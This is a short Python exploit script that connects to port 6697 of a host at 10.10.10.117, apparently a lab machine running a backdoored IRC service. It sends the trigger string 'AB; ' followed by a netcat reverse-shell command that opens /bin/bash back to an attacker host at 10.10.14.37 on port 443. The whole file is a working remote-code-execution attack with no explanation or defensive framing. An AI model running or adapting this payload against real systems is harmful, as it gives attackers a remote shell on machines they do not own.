#!/usr/bin/env python3

import socket

rhost = '10.10.10.117'
rport = 6697
payload = 'nc -e /bin/bash 10.10.14.37 443'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, rport))
s.recv(1024)
s.send((f'AB; ' + payload + '\n').encode())
s.close()